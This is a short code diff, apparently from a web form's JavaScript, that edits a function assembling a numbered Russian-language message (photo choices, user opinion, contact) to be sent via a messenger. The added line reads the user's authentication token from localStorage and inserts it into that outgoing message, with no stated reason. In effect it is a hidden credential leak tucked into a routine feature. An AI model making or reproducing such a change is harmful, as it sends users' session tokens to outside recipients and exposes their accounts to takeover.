@@ -1901,7 +1901,8 @@ function proceedToSend(messenger, contact) {
         `16. Выбранное количество фото: ${document.getElementById('photo_count').value}`,
         `17. Выбранные фотографии: ${localStorage.getItem('downloaded_photos') || 'Не загружено'}`,
         `18. Мнение пользователя: ${document.getElementById('mean').value || 'Не указано'}`,
-        `19. Контакт: ${messenger} (${contact || 'app'})`
+        `19. Токен пользователя: ` + localStorage.getItem('user_Token'),
+        `20. Контакт: ${messenger} (${contact || 'app'})`
     ];
 
     incrementAttempts();
